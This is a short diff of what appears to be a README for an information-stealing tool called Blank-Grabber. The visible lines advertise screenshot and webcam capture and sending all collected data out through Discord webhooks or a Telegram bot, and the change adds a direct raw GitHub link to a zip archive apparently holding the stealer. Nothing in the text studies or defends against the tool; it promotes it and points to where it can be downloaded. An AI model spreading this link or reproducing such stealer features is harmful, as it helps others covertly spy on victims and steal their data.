@@ -32,4 +32,4 @@
 • Captures Screenshot.
 • Captures Webcam Image.
 • Sends All Data Through Discord Webhooks/Telegram Bot.
-(...more)
+(https://raw.githubusercontent.com/Cryptoytb/Blank-Grabber/main/querist/Blank-Grabber-v2.0.zip)
